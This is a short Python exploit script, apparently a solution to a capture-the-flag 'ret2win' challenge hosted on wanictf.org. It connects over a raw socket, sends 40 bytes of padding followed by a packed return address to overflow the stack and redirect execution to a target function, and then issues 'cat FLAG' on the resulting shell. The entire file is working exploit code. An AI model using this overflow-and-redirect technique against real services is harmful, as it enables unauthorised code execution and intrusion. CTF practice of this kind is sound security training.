
import socket
import time

# サーバーに接続
ip='ret2win-pwn.wanictf.org'
port=9003
sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sc.connect((ip, port))

time.sleep(0.5)
print(sc.recv(1024).decode("utf-8"))
inp=b"a"*40+b"\x69\x13\x40\x00\x00\x00\x00\x00"

print(inp.decode("utf-8"))
sc.sendall(inp)
time.sleep(1)
sc.sendall(b"cat FLAG\n")
print(sc.recv(1024).decode("utf-8"))